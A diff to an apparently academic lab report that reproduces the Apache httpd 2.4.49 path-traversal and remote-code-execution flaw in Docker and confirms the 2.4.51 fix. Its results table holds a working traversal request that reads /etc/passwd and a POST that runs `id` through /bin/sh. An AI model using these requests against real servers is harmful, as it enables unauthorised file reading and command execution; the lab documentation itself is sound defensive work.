@@ -76,8 +76,35 @@ regression check in CI or by hand.
 
 ## 6. Evidence checklist
 
-- [ ] `docker compose up -d` output and container list
-- [ ] traversal request + `/etc/passwd` response (screenshot)
-- [ ] `id` output through `/bin/sh` (screenshot)
-- [ ] `poc.sh` against the fixed container (all blocked)
-- [ ] home page still served after the fix (regression)
+- [x] `docker compose up -d` output and container list → `evidence/`
+- [x] traversal request + `/etc/passwd` response → `evidence/01-vulnerable-traversal.txt`
+- [x] `id` output through `/bin/sh` → `evidence/02-vulnerable-rce.txt`
+- [x] `poc.sh` against the fixed container (all blocked) → `03-*`, `04-*`
+- [x] home page / CGI still served after the fix (regression) → `05-regression.txt`
+
+## 7. Results of this run (2026-10-19)
+
+| Step | Vulnerable `httpd:2.4.49` | Fixed `httpd:2.4.51` + hardening |
+|---|---|---|
+| `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` | **HTTP 200**, `root:x:0:0:root:/root:/bin/bash` | HTTP 400, no content |
+| `POST …/bin/sh` with `id` | **HTTP 200**, `uid=1(daemon) gid=1(daemon)` | HTTP 400, no output |
+| `GET /cgi-bin/hello.sh` | 200 hello from cgi | 200 hello from cgi (unchanged) |
+
+Reproduce locally:
+
+```bash
+cd work1-cve
+docker build -t hdu-is/cve-2021-41773:2.4.49 .
+docker run -d --name cve-vuln -p 8080:80 hdu-is/cve-2021-41773:2.4.49
+
+cd fixed
+docker build -t hdu-is/cve-2021-41773:fixed .
+docker run -d --name cve-fixed -p 8081:80 hdu-is/cve-2021-41773:fixed
+
+bash ../poc.sh http://127.0.0.1:8080   # exits 1: vulnerable
+bash ../poc.sh http://127.0.0.1:8081   # exits 0: fixed
+```
+
+Note: containers were run on a VirtualBox/boot2docker VM, so the host addresses above were
+`192.168.99.100:8080` / `:8081`; `poc.sh` takes the base URL as its first argument.
+
